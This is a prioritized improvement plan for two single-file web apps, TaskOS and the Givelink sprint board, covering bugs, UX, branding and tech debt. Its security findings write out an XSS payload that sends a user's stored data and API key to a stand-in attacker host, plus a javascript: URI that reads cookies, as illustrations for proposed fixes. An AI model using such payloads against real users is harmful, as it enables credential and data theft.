# Givelink — Improvement Plan

_Generated: 2026-05-12 | Scope: index.html (TaskOS, 6 713 lines) + givelink.html (Sprint Board, 1 716 lines)_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. XSS: Task and goal titles rendered unescaped in Weekly Review wizard
**What:** `t.title` and `g.title` are interpolated directly into `innerHTML` with no HTML escaping.  
**Where:** `index.html:1826`, `index.html:1833`, `index.html:1835`  
**Why it matters:** A task title containing `<img src=x onerror="fetch('https://attacker/'+localStorage.getItem('taskos'))">` executes in the user's browser the moment the Weekly Review opens, exfiltrating the entire data store including the Claude API key.  
**Effort:** S  
**Suggested fix:**
- Replace every bare `${t.title}` and `${g.title}` inside `.innerHTML` template literals with `${esc(t.title)}` / `${esc(g.title)}` — the `esc()` helper already exists at line 5662.
- Grep for other render functions that do the same pattern: `grep -n '\${t\.title}' index.html | grep -v 'esc('`.

---

### 2. `callClaudeGL()` swallows API errors silently; users see nothing
**What:** `callClaudeGL` in givelink.html calls `res.json()` without first checking `res.ok`, and returns `null` on any error response without showing a toast.  
**Where:** `givelink.html:1230-1232`  
**Why it matters:** On a 401 (bad key) or 429 (rate limit), the function returns `null` silently. Every AI button in the sprint board appears to "do nothing", leading users to click multiple times and accumulate charges or assume the feature is broken.  
**Effort:** S  
**Suggested fix:**
- After `const data=await res.json();`, check `if(!res.ok){ toast('AI error '+res.status+': '+(data.error?.message||res.statusText)); return null; }`.
- Mirror the robust error handling already in `callClaude()` at `index.html:2732-2735`.

---

### 3. Reminder fires `lastFired = today` before checking if notification was delivered
**What:** `r.lastFired=today; save()` is called at line 5184, two lines *before* `new Notification()` runs inside a try/catch. If the browser throws (permission denied, unsupported API), the reminder is permanently marked as "already fired today" and is silently skipped for the rest of the day.  
**Where:** `index.html:5183-5188`  
**Why it matters:** Users who haven't explicitly granted notification permission — or are on an unsupported browser — will set up daily reminders that are immediately marked delivered and never actually fired. There is zero feedback.  
**Effort:** S  
**Suggested fix:**
- Move `r.lastFired=today; save()` into the `try` block, after `new Notification()` succeeds.
- In the `catch(e)` block, add `toast('Reminder "'+r.label+'" could not fire — check notification permissions.')`.

---

### 4. `save()` has no error handling — data loss on localStorage quota exceeded
**What:** `save()` calls `localStorage.setItem('taskos', JSON.stringify(S))` with no try/catch. Browsers enforce a ~5 MB localStorage quota; once reached, the call throws `QuotaExceededError` and the write is silently dropped.  
**Where:** `index.html:1564`  
**Why it matters:** Power users accumulating health logs, deep work sessions, finance entries, and review history will eventually hit the quota. Every save after that is silently lost — the user believes their data is persisted but it is not.  
**Effort:** S  
**Suggested fix:**
- Wrap `localStorage.setItem` in `try/catch(e){ if(e.name==='QuotaExceededError') toast('⚠️ Storage full — export a backup before adding more data.'); }`.
- Show storage usage in Settings: `(JSON.stringify(S).length/1024).toFixed(0) + ' KB used'`.

---

### 5. All `fetch()` calls have no timeout — UI hangs indefinitely on slow/dead endpoints
**What:** No `AbortController` or `AbortSignal.timeout()` is set on any of the four external API calls (Anthropic, Notion, Readwise, ntfy).  
**Where:** `index.html:2727`, `index.html:4829`, `index.html:4709`, `givelink.html:1092`, `givelink.html:1225`  
**Why it matters:** If the Anthropic API stalls (not fails, but stalls), the toast "⏳ sequencing…" disappears after 2.5 s while the pending request keeps the button active. The user is stuck with no way to cancel, and the eventual response — arriving minutes later — will overwrite whatever the user typed in the meantime.  
**Effort:** S  
**Suggested fix:**
- Add `signal: AbortSignal.timeout(20000)` to each `fetch()` options object.
- In the `catch(e)` block, distinguish `e.name==='TimeoutError'` and show `toast('Request timed out — check your connection.')`.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 6. Off-brand color: entire UI uses blue instead of Givelink's purple palette
**What:** Both files define `--accent` as blue (`#3b82f6` in givelink.html, `#58a6ff` in index.html). The Givelink brand palette is purple (`#6B3FA0` / `#5718CA`) and pink (`#C2185B` / `#E353B6`).  
**Where:** `index.html:16-17`, `givelink.html:17`  
**Why it matters:** The sprint board is the primary tool the Givelink team uses daily; it presents a blue brand identity to anyone who glances at the screen. If shared externally (demo, investor, partner onboarding), it actively undermines brand recognition.  
**Effort:** S  
**Suggested fix:**
- Change `--accent` to `#5718CA` in givelink.html; use `#6B3FA0` as hover/muted variant.
- Do not place pink badges (`--pr:#f472b6`) on purple backgrounds in the same component — keep them to separate rows/elements.
- Update `<meta name="theme-color">` to match (`#5718CA`).

---

### 7. No data export: users face total loss if browser storage is cleared
**What:** All app state is in a single `localStorage` key with no visible backup or export button.  
**Where:** `index.html:1564` (save), `index.html:1565` (load); no export function exists anywhere  
**Why it matters:** Clearing browser data, switching devices, or a browser crash permanently destroys months of tasks, goals, health logs, and review history. This is table-stakes for any tool that asks users to trust it with personal data.  
**Effort:** M  
**Suggested fix:**
- Add "Export JSON" to Settings: `document.createElement('a')` with `href=URL.createObjectURL(new Blob([JSON.stringify(S)]))` and `download='taskos-backup.json'`.
- Add "Import JSON" reader that validates the payload and merges or replaces.
- Prompt once per month if no backup has been taken: store `S.lastBackup` date.

---

### 8. Hardcoded founder identity in AI outreach and standup prompts
**What:** Two AI prompts in givelink.html hardcode `"Panos Evangelou, co-founder of Givelink"` and `"Panos, founder of Givelink"`.  
**Where:** `givelink.html:1453`, `givelink.html:1598`  
**Why it matters:** If any teammate or the second co-founder uses the sprint board's outreach generation, every AI-written email will misrepresent who sent it. This is a real liability on cold outreach to nonprofit partners.  
**Effort:** S  
**Suggested fix:**
- Add a "Your name" and "Your title" field to the Settings modal in givelink.html, persisted as `S.senderName` / `S.senderTitle`.
- Replace the hardcoded strings with `${S.senderName||'the Givelink team'}`.

---

### 9. AI trigger buttons not disabled during in-flight requests; duplicate calls silently stack
**What:** Buttons that call AI functions (Sequence Tasks, Suggest Bucket Items, Generate Outreach, etc.) are never disabled while a request is in-flight. The confirmation toast disappears after 2.5 s while the request is still running.  
**Where:** `index.html:2752` (aiSequenceTasks), `index.html:6058` (aiSuggestBucket), `givelink.html:1593` (generateOutreach), and ~10 other AI entry points  
**Why it matters:** Users who click twice send two identical API requests simultaneously; the responses race and the second one overwrites the first. On `claude-opus-4-5` each call is ~$0.01–0.05, so accidental doubles add up over a day's use.  
**Effort:** S  
**Suggested fix:**
- Store a `let _aiInFlight = false` guard in each AI function; `if(_aiInFlight) return; _aiInFlight=true;` at the top, reset in `finally`.
- Or: disable the button with `btn.disabled=true; btn.textContent='⏳ …';` and restore in `finally`.

---

### 10. CRM kanban has no responsive breakpoint — cards become unreadable below ~1200 px
**What:** `.crm-kanban` uses `grid-template-columns: repeat(6, 1fr)` with no media query.  
**Where:** `givelink.html:197`  
**Why it matters:** On a 13" laptop at 1280 px each of the six stage columns is ~180 px wide; task card text wraps aggressively and the add-task buttons disappear below the fold. The CRM is the most-used view in the Givelink sprint board.  
**Effort:** S  
**Suggested fix:**
- Add `@media(max-width:1200px){.crm-kanban{grid-template-columns:repeat(3,1fr);}}` and `@media(max-width:768px){.crm-kanban{grid-template-columns:1fr 1fr;overflow-x:auto;}}`.
- Ensure `overflow-x:auto` on the container so the kanban scrolls rather than clips at very small sizes.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. `seed()` ships 394 lines of a specific developer's personal tasks in production
**What:** `seed()` runs on every new session and populates the app with a specific individual's goals, tasks, books, health records, and finance entries.  
**Where:** `index.html:2250-2644`  
**Why it matters:** New users open the app and see someone else's personal productivity data. It destroys the first-run experience and makes it impossible to evaluate what a blank app would look like.  
**Effort:** S  
**Suggested fix:**
- Guard with `if(location.search.includes('demo'))` or `if(S._seeded)return;` (set `S._seeded=true` afterward).
- Replace with 2–3 example tasks that demonstrate the features without injecting personal data.

---

### 12. `javascript:` URIs not blocked in Wishlist URL field
**What:** `href="${esc(x.url)}"` escapes HTML characters but does not strip `javascript:` protocol — a stored URL of `javascript:alert(document.cookie)` executes on click.  
**Where:** `index.html:6109`  
**Why it matters:** Since the app stores the Claude API key in localStorage, a stored malicious URL combined with a careless paste from a phishing site would exfiltrate the key.  
**Effort:** S  
**Suggested fix:**
- Sanitize before render: `function safeUrl(u){try{const p=new URL(u);return['https:','http:'].includes(p.protocol)?u:'#';}catch{return '#';}}`.
- Replace `href="${esc(x.url)}"` with `href="${safeUrl(x.url)}"`.

---

### 13. ~400 lines of CSS duplicated verbatim across both HTML files
**What:** Button classes (`.btn`, `.bp`, `.bg`, `.bd`), modal structure (`.mo`, `.md`, `.mh`), form elements (`.fc`, `.fg`), and badge styles are defined identically in both `index.html` and `givelink.html`.  
**Where:** `index.html:29-120`, `givelink.html:108-128` (and scattered throughout both)  
**Why it matters:** Visual bugs (e.g., a button contrast issue) must be fixed in two places. The files are already drifting — givelink.html uses `.bp`/`.bg`/`.bd` while index.html uses `.btn.bp`/`.btn.bg`, causing confusion when copying components between files.  
**Effort:** M  
**Suggested fix:**
- Extract shared CSS into `styles.css`; both files `<link rel="stylesheet" href="styles.css">`.
- Keep only file-specific overrides inline.

---

### 14. AI JSON parsing uses regex extraction; failures are invisible
**What:** Responses from Claude are parsed with `s.match(/\[[\s\S]*\]/)?.[0]` followed by `JSON.parse`. If the match fails, `items` stays `[]` and the UI shows nothing with zero user feedback.  
**Where:** `index.html:6067` (bucket list suggestions), and similar patterns in aiSuggestDecisions, aiPlanProject  
**Why it matters:** When a Claude model responds in unexpected format (common after model updates), the feature silently produces an empty list. Users assume it "just doesn't work" rather than triggering a retry.  
**Effort:** S  
**Suggested fix:**
- On parse failure, log the raw response (`console.error('AI parse failed:', txt)`) and show `toast('AI returned an unexpected format — try again')`.
- Consider prompting Claude to return a JSON code block, then strip fences before parsing, which is more reliable than a bracket-matching regex.

---

### 15. No error monitoring — production crashes are completely invisible
**What:** There is no `window.onerror`, `window.onunhandledrejection`, Sentry, or any other crash reporting.  
**Where:** Neither `index.html` nor `givelink.html`  
**Why it matters:** The only way to discover a production bug is for a user to report it. Given the app stores locally and has no backend, silent regressions (a render function that throws on a new data shape) could go unnoticed for weeks.  
**Effort:** M  
**Suggested fix:**
- Add a global handler: `window.addEventListener('unhandledrejection', e => _ntfyPost(S.ntfy?.topic, '⚠️ TaskOS crash', e.reason?.message||String(e.reason), ['bug']))` — reuse the already-integrated ntfy infrastructure for zero-cost crash alerts sent to the developer's own phone.
- Gate this on a `S.devMode` flag so it only fires for the developer's instance.

---

### 16. Monolithic 6 713-line `index.html` with all JS, CSS, and HTML inline
**What:** The entire application — routing, data model, 25+ feature modules, all UI templates — lives in a single unmodularised file with no build step.  
**Where:** `index.html:1-6713`  
**Why it matters:** Any PR touches hundreds of lines; git diffs are unreadable. Adding a feature requires scrolling through thousands of lines to find the right function. Regressions are hard to isolate. This is the single largest velocity drag in the codebase.  
**Effort:** L  
**Suggested fix:**
- Introduce a minimal Vite build (`npm create vite@latest`) with `src/features/` modules and a shared `src/state.js`.
- Migrate one feature at a time; the monolith and the module can coexist during transition.
- Immediate win (no build tooling required): extract the `<style>` block to `styles.css` and the `<script>` block to `app.js` — this alone makes diffs readable.

---

## 💡 P3 — Nice to have

### 17. No localStorage schema versioning — future data migrations have no safe path
**What:** `load()` merges stored JSON with defaults via `S={...S,...JSON.parse(d)}` with no version field. If a key is ever renamed (e.g., `healthLogs` → `logs`), old stored data is silently ignored.  
**Where:** `index.html:1565`  
**Why it matters:** Not a problem today, but every data-shape change becomes a ticking time bomb for existing users.  
**Effort:** S  
**Suggested fix:** Add `S.schemaVersion=1`; on load, run `migrate(stored)` that maps old shapes to new before merging. Increment the version number with each breaking data change.

---

### 18. System color-scheme preference ignored on first load
**What:** `initTheme()` only reads `localStorage.getItem('taskos_theme')`; it never checks `window.matchMedia('(prefers-color-scheme: light)')`.  
**Where:** `index.html:1561`  
**Why it matters:** Users on light-mode systems see a dark app on first visit, which reads as a bug and breaks the on-brand experience before they've even started.  
**Effort:** S  
**Suggested fix:** `applyTheme(localStorage.getItem('taskos_theme')==='light' || (!localStorage.getItem('taskos_theme') && window.matchMedia('(prefers-color-scheme: light)').matches))`.

---

### 19. Icon-only interactive elements have no ARIA labels
**What:** Hamburger menu buttons, modal close buttons (`×`), and inline action icons have no `aria-label` attribute.  
**Where:** `index.html` sidebar toggle, all modal close buttons; `givelink.html:127` (`.mc` close buttons)  
**Why it matters:** Screen readers announce these as empty or unlabelled buttons, making the app unusable for any visually-impaired user.  
**Effort:** S  
**Suggested fix:** Add `aria-label="Close"` to all `×` buttons, `aria-label="Open menu"` to hamburger toggles, and `aria-label` to any button whose visible content is an emoji or icon only.

---

_Total items: 19 (5 P0 · 5 P1 · 6 P2 · 3 P3)_
